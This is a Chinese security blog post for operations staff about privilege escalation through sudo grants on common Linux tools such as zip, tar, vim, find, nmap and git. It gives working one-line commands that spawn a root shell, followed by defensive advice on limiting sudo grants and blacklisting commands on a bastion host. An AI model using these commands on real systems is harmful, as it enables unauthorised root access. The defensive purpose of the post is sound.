> 原文链接: https://www.anquanke.com//post/id/158511 


# 运维安全之如何防范利用sudo进行提权获取完整root shell


                                阅读量   
                                **220242**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01efa41930ef15a2aa.jpg)](https://p0.ssl.qhimg.com/t01efa41930ef15a2aa.jpg)

> 严正声明：本文仅限于技术讨论与学术学习研究之用，严禁用于其他用途（特别是非法用途，比如非授权攻击之类），否则自行承担后果，一切与作者和平台无关，如有发现不妥之处，请及时联系作者和平台

## 0x00. sudo 是个啥

在日常的运维安全工作中，经常会遇到开发 OR 测试 同学要求: 我需要在某某服务器上运行一个东东，必须以root权限运行，请帮忙处理下。怎么办？ 直接给root账户，让其搞去？ 不存在的，但凡是个有章程的公司都不会共享root账户，比较普遍的做法就是利用sudo （Substitute User and Do 的简写）给其临时授权，可以临时让其以root 权限运行某个程序。 但是运维的小伙子们，sudo 授权可要小心，不能求而不拒，什么程序都放行，不然可能会被别有用心的人恶意提权成root账户权限。 下文会详细介绍如何利用特定的sudo 授权程序进行提权。



## 0x01. 警惕常见的可以利用sudo授权然后提权成完整root权限的程序（命令）

### 1）zip

[![](https://p2.ssl.qhimg.com/t01764c487d14d6f4b8.png)](https://p2.ssl.qhimg.com/t01764c487d14d6f4b8.png)

test 用户是个普通用户，申请sudo 授权zip 命令

然后执行：

`sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"`

成功提权成完整root权限

简单解释下 提权是如何实现的

-T 表示测试test.zip的完整性

—unzip-command 与-T 一起使用，可以指定自定义命令 用于解压test.zip(测试用)

利用点就在 可以自定义用于解压test.zip 的的命令，当然自定义解压命令是以root权限执行的，这里指定为sh -c /bin/bash, 就可以以root权限获取一个shell

### 2）tar

[![](https://p4.ssl.qhimg.com/t01507ae2a0fdc7d0bb.png)](https://p4.ssl.qhimg.com/t01507ae2a0fdc7d0bb.png)

test 用户是个普通用户，申请sudo 授权tar命令

然后执行：

`sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash`

成功提权成完整root权限

简单解释下 提权是如何实现的

[![](https://p5.ssl.qhimg.com/t01f467e635995d80ae.png)](https://p5.ssl.qhimg.com/t01f467e635995d80ae.png)

–checkpoint-action 选项是提权点，可以自定义需要执行的动作，当然是以root权限执行

这里指定为exec=/bin/bash，以root权限执行/bin/bash，获取一个root权限的shell

### 3）strace

[![](https://p4.ssl.qhimg.com/t01830ca25b8667615a.png)](https://p4.ssl.qhimg.com/t01830ca25b8667615a.png)

简单解释下 提权是如何实现的

strace 以root权限运行跟踪调试/bin/bash, 从而获取root权限的shell

### 4）nmap

[![](https://p0.ssl.qhimg.com/t01c617fe4e193dd2bd.png)](https://p0.ssl.qhimg.com/t01c617fe4e193dd2bd.png)

以root权限执行nmap ，然后nmap执行脚本，脚本执行/bin/sh, 获取root 权限shell

如果是老版本的nmap，还可以换一种姿势利用nmap 实现root 提权

```
sudo nmap --interactive
nmap&gt; !sh
sh-4.1#
```

### 5） more<br>[![](https://p2.ssl.qhimg.com/t01216fe6e882adaf58.png)](https://p2.ssl.qhimg.com/t01216fe6e882adaf58.png)

`sudo more /etc/rsyslog.conf`

然后键入

!/bin/bash 即可获取root权限的shell

同理的命令还有 less 和 man （sudo man ssh）

### 6) git

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0106e642a4a04d744c.png)

`sudo git help status`

然后键入!/bin/bash 即可以root 权限运行/bin/bash, 获取root权限的shell，原理同more

### 7）ftp

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011a78f7ae56365535.png)

`sudo ftp`

在ftp交互式接口下键入!/bin/bash, 便可以root权限运行/bin/bash, 获取root权限的shell

### 8）vim

[![](https://p3.ssl.qhimg.com/t011b1391f2c7fbc054.png)](https://p3.ssl.qhimg.com/t011b1391f2c7fbc054.png)

`sudo vim -c  '!sh'` 可以直接以root权限运行 指定命令，这里可以直接获取root权限的shell

### 9）find

[![](https://p3.ssl.qhimg.com/t01473ae7dfac898a55.png)](https://p3.ssl.qhimg.com/t01473ae7dfac898a55.png)

`sudo find /bin/ -name ls -exec /bin/bash ;`

对于find 检索到的每一个结果，都执行/bin/bash, 是以root权限执行的哦，很方便的获取root 权限的shell

### 10 ) passwd

[![](https://p5.ssl.qhimg.com/t01c441382f0c101ee9.png)](https://p5.ssl.qhimg.com/t01c441382f0c101ee9.png)

sudo passwd 可以更改root的密码

然后su –

输入修改后的root密码，就可以切换到root shell



## 0x02. 如何防范？

这才是我关注的重点

必须得说，这个不是很好防范，只能尽量减少风险

sudo的配置文件只能限制那些用户可以使用sudo，可以使用哪些命令，但不能限制用户使用这些命令进行提权获取root shell，我们设置sudo的本意就是让用户能临时获取root 权限执行某些命令而不是永久获取root shell 并可以root权限执行任何命令，有什么好的办法的？ 我总结了以下几个方法以期能减少sudo 使用带来的风险

1） 不要安装某些工具命令

比如strace、ftp、nmap、tcpdump、except、nano，这些命令都是可以实现sudo + 命令 提权成root shell的，况且这些命令都不是必须的

2） sudo 不能滥授权

授权之前，必须仔细审核，能不授权的授权，多考虑替代方案，必要的才授权

2）其次使用堡垒机拦截非法命令

有人说将用户加入root组，不存在的，加入root组并不能保证用户以root身份执行某些命令。 最好的办法就是前置堡垒机，在堡垒机上进行非法命令拦截，经过我的一番探索，在我司的堡垒机（基于jumpserver 二次开发，研究过jumpserver代码的对下文代码应该会比较熟悉）上实现了拦截非法sudo 提权命令的功能：

代码简写如下：

[![](https://p1.ssl.qhimg.com/t0123966cfec3e03ef8.png)](https://p1.ssl.qhimg.com/t0123966cfec3e03ef8.png)

data 即为解析后的完整命令，通过正则匹配来检测是否有非法命令（黑名单思路，故有可能被绕过，白名单不知道咋搞，有好的思路的大牛在下面留言中指点下小弟）



## 0x03. 总结

如果获取了对于某个命令的sudo 授权，则有可能利用sudo获取root shell，所以在审核申请人sudo 请求的时候，一定要留心。当然还有很多其他命令可以实现0x01 提到的哪些命令所实现的root提权，比如 nano 、wget （通过写密码文件）、tcpdump等，如果大伙有更多可以提权的命令，不妨在留言中补充

本文参考资料：

[http://touhidshaikh.com/blog/?p=790](http://touhidshaikh.com/blog/?p=790)

[http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/](http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/)
